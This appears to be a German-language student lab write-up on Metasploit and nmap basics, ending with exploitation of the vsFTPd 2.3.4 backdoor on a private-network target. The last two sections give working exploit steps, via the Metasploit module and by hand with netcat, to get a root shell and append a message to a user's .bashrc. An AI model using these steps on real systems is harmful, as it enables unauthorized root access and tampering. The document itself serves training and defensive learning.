## Übung (msf basics)

### Metasploit Framework
Das Metasploit Framework wurde mit msfconsole gestartet. Wichtige Befehle sind:

- search <Begriff> – Modul suchen

- use <Modul> – Modul aktivieren

- info – Modulinformationen

- set <Option> / setg <Option> – Optionen setzen

- run / exploit – Modul ausführen

- sessions – aktive Sessions anzeigen
  
- setg RHOSTS 192.168.56.101 erleichtert die wiederholte Nutzung von Modulen.

### Globale Optionen in Metasploit (setg)
In Metasploit können Optionen entweder lokal (set) oder global (setg) gesetzt werden.
Der Befehl setg steht für „set global“ und speichert eine Option dauerhaft für alle Module innerhalb der aktuellen Metasploit-Session.

## Übung (nmap FTP scan)

nmap Vulnerability Scan
Um die Sicherheitslücke im FTP-Dienst zu identifizieren, wurde folgender Befehl ausgeführt:

nmap -p 21 --script=vuln 192.168.5.51

Das Ergebnis zeigte, dass auf dem Zielsystem vsFTPd Version 2.3.4 installiert ist und als VULNERABLE markiert wurde.
Die Schwachstelle ist unter CVE-2011-2523 bekannt.

Die Backdoor funktioniert folgendermaßen:

Wenn sich ein Benutzer mit einem Benutzernamen anmeldet, der ein :) enthält, öffnet der Server automatisch Port 6200 und startet eine Shell mit Root-Rechten.

Eigenschaften:

- Keine Authentifizierung erforderlich

- Remote ausnutzbar

- Root-Rechte sofort verfügbar

- Kritische Sicherheitsstufe

Die --script=vuln Skripte gelten als intrusive, weil sie:

- aktiv versuchen Exploits auszuführen

- Systemzustände verändern können

- Dienste abstürzen lassen könnten

Deshalb sind sie nicht in:

-sC

-A

enthalten, da diese Optionen nur „sichere“ Skripte ausführen.


## Übung (msf FTP Version herausfinden)

Das Modul lautet:

auxiliary/scanner/ftp/ftp_version

Es befindet sich in der Kategorie „scanner“ und dient zur Versionsbestimmung des FTP-Dienstes.

Zur Versionsbestimmung des FTP-Dienstes wurde das Metasploit-Modul auxiliary/scanner/ftp/ftp_version verwendet. 
Nach Aktivierung des Moduls mit use auxiliary/scanner/ftp/ftp_version und Setzen des Targets mit set RHOSTS 192.168.5.51 wurde der Scan mittels run durchgeführt. 
Das Modul bestätigte, dass auf dem Zielsystem vsFTPd 2.3.4 installiert ist. Damit konnten die nmap-Ergebnisse validiert werden. 


## Übung (msf vsftpd exploit)

Zur Ausnutzung der Backdoor wurde das Modul exploit/unix/ftp/vsftpd_234_backdoor verwendet:

```
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.5.51
run
```

Nach erfolgreicher Ausführung konnte eine Root-Shell geöffnet werden, was durch den Befehl whoami bestätigt wurde:

whoami
Ausgabe: root

Anschließend wurde eine Nachricht hinterlassen, die beim Login des Benutzers msfadmin automatisch angezeigt wird:

echo "you have been hacked!" >> /home/msfadmin/.bashrc

Die Backdoor ermöglicht somit die vollständige Kontrolle über das Zielsystem.


## Übung (exploit ohne msf)

Die Backdoor wurde zusätzlich manuell über Netcat ausgenutzt:

```
nc 192.168.5.51 21
USER test:)
PASS test
```

Durch den Smiley :) im Benutzernamen wurde die Backdoor aktiviert, wodurch Port 6200 geöffnet wurde:
```
nc 192.168.5.51 6200
whoami
```

Es zeigt, dass die Sicherheitslücke auch ohne Metasploit ausgenutzt werden kann.
